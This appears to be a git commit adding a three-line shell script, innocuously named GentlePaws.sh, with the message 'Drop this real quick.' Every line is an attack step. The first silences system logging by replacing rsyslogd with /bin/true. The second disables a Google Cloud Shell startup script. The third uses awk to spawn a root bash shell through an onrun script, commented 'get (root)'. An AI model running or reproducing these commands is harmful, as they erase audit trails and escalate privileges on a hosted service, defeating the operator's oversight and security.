4a94a70db9f112cb824e51900f0bdcf58ce0112c
ZoeyTheArtGirl <sharkplayz1634@gmail.com>
2026-08-28 10:22:18 +0100

    Drop this real quick.

---
+++ GentlePaws.sh
@@ -0,0 +1,3 @@
+sudo mv /usr/sbin/rsyslogd /usr/sbin/rsyslogd.bak && sudo ln -s /bin/true /usr/sbin/rsyslogd # Kill these blocking scripts
+sudo mv /google/devshell/startup.sh /google/devshell/startup.sh.bak && sudo ln -s /bin/true /google/devshell/startup.sh # Send 'The web IDE started successfully' to onrun, so it doesn't hang
+sudo awk 'BEGIN {system("env USER=root /google/scripts/onrun.sh /bin/bash")}' # get (root)
